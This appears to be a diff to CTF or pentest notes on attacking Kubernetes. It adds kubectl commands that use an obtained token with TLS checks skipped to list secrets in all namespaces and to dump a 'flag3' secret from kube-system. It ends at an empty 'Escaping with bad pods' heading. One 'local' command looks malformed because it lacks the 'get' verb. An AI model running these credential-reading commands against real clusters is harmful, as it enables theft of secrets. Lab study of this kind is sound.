@@ -114,3 +114,24 @@ kubectl api-resources --server https://ip:port --token=$TOKEN --insecure-skip-tl
 ```
 kubectl api-resources --token=$TOKEN --insecure-skip-tls-verify
 ```
+
+Get namespaces from within API Example is through a API called "secrets":
+
+(Remote):
+```
+kubectl --server https://10.10.103.214:6443 --token=$TOKEN --insecure-skip-tls-verify get secrets --all-namespaces
+```
+
+(Local):
+```
+kubectl --token=$TOKEN secrets --all-namespaces
+```
+
+Pull up YAML output of name/namespaces(example for flag3):
+
+```
+kubectl --server https://10.10.103.214:6443 --token=$TOKEN --insecure-skip-tls-verify get secrets flag3 -n kube-system -o yaml
+```
+
+### Escaping with bad pods
+
